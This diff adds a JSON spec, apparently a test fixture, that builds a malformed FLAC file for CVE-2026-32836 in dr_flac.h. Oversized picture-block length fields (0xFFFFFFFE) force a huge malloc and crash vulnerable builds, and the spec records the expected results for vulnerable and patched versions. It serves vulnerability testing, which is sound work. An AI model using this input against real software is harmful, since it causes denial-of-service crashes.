@@ -1,0 +1,23 @@
+{
+ "name": "flac_picture_oom — CVE-2026-32836, dr_flac.h <= 0.13.3, drflac__read_and_decode_metadata() :6750/:6772",
+ "magic": "hex:664c6143",
+ "blocks": [
+    {"type": 0, "last": false, "body_len": 34},
+    {"type": 6, "last": true,
+     "body": "hex:0000000000000000000000000000000000000000000000000000000000000000"}
+ ],
+ "fields": [
+    {"offset": 50, "size": 4, "endian": "big",
+     "name": "mime_length", "value": "0xFFFFFFFE",
+     "note": "triggers malloc(0xFFFFFFFF) at dr_flac.h:6750"},
+    {"offset": 54, "size": 4, "endian": "big",
+     "name": "description_length", "value": "0x00000000",
+     "note": "second stage: malloc at :6772 (arm with --set description_length=0xFFFFFFFE)"}
+ ],
+ "pad_to": 78,
+ "expected": {
+    "vulnerable": "ASan abort: malloc(4294967295) @ dr_flac.h:6750 (or :6772 with desc override)",
+    "patched": "bounds check first; open returns NULL",
+    "gate": "only drflac_open_*_with_metadata() with onMeta != NULL (dr_flac.h:6728)"
+ }
+}
